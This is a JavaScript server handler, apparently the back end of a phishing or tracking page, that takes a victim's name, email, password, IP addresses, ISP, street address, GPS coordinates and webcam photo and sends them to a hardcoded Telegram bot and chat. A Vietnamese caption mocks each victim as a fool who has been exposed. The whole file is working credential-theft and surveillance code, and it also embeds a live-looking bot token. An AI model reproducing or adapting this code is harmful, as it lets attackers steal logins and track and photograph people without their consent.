const BOT_TOKEN = '7924007259:AAGOQrtIr6JUvTwo6A8ZOIh08KIJkRE4hsQ';
const CHAT_ID = '-1004469272954';

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ status: 'error', message: 'Method Not Allowed' });
    }

    try {
        const info = JSON.parse(req.body.info || '{}');
        const photo = req.body.photo || null;

        const caption = `
THÊM 1 THẰNG NGU LỘ MẶT RỒI ANH EM ƠI

👤 Tên: ${info.name || 'Không rõ'}
📧 Email: ${info.email || 'Không rõ'}
🔑 Mật khẩu: ${info.password || 'Không rõ'}
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time || 'Không rõ'}
📱 Thiết bị: ${info.device || 'Không rõ'}
📐 Màn hình: ${info.screen || 'Không rõ'}
🌍 IP dân cư: ${info.ip || 'Không rõ'}
🧠 IP gốc: ${info.realIp || 'Không rõ'}
🏢 ISP: ${info.isp || 'Không rõ'}
🌎 Quốc gia: ${info.country || 'Không rõ'}
📍 Vị trí: ${info.address || 'Không rõ'}
📍 Vĩ độ: ${info.lat || '0'}
📍 Kinh độ: ${info.lon || '0'}
📸 Camera: ${info.camera || 'Chưa kiểm tra'}
📌 Maps: https://maps.google.com/maps?q=${info.lat},${info.lon}
        `.trim();

        let result;
        if (photo) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('caption', caption);
            formData.append('photo', photo);

            result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } else {
            result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: caption
                })
            });
        }

        const data = await result.json();

        if (data.ok) {
            return res.status(200).json({ status: 'success', message: 'Đã gửi thông tin' });
        } else {
            return res.status(500).json({ status: 'error', message: data.description || 'Lỗi Telegram' });
        }
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
